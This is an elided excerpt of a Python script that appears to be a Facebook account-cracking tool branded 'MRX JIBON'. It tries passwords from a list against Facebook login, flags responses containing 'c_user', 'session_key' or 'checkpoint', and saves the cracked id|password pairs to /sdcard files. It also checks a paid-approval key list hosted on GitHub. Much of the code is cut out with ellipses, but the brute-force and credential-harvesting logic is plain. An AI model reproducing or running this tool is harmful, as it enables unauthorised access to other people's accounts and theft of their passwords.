...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Mrx-Jibon/Kkoop/blob/main/Kkoop.txt').text
		ua=open('.bbnew.txt','w')
...
\033[1;93m--------------------------------------------------
  \033[1;32mF4C3B00K  : JIBON SARKER
  \033[1;32mY0UTUB3   : MRX JIBON
  \033[1;32mV3RS10N   : 10.10
  \033[1;32m0WN3R     : MD JIBON SARKER
--------------------------------------------------
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/MRX JIBON.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/MRX JIBON.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/MRX JIBON.txt\033[0;97m')
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL');menu()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [MRX JIBON-OK] %s | %s'%(ids,pas))
				open('/sdcard/MRX JIBON-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [MRX JIBON-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/MRX JIBON-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [MRX JIBON-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/MRX JIBON-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [MRX JIBON-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [MRX JIBON-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  print("""\033[1;37m
    ...
    \033[1;32m   MD JIBON SARKER
    \033[1;33m   MRX JIBON BRAND 
    \033[1;34m   MD JIBON ISLAM 
    \033[1;35m   MRX BRAND 
    \033[1;36m   MRX CYBER 71
    \033[1;37m   MRX JIBON 
    \033[1;38m   MRX CYBER HACKER
    \033[1;32m_______________________________________
\033[1;37m[-] AUTHOR    :\033[1;32m JIBON SARKER
\033[1;37m[-] GITHUB    :\033[1;32m Mr
...
==================================================   """)
  ...
  try:
    httpCaht = requests.get("https://github.com/MR-K1NGX/PAID/blob/main/MUMT4Z.txt").text
    if id in httpCaht:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/Mrx-Jibon/Kkoop/blob/main/Kkoop.txt').text
  ...
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/Mrx-Jibon/Kkoop/blob/main/Kkoop.txt").text
    if id in httpCaht:
      print("\033[1;97m   YOUR TOKEN APROVED ðŸ¥€ ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
